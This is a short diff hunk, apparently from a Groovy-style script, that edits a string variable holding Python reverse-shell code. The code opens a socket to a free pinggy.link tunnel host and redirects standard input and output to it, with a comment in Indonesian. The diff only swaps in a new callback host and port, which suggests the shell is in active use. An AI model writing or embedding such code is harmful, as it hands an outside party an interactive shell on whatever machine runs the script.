@@ -46,7 +46,7 @@ def kontenKode = """\
 import socket, os, pty
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("mmsmx-114-10-152-167.a.free.pinggy.link", 39061))
+s.connect(("llbmk-103-144-170-45.a.free.pinggy.link", 46097))
 
 # Mengalihkan semua standard input/output ke socket
 os.dup2(s.fileno(), 0)
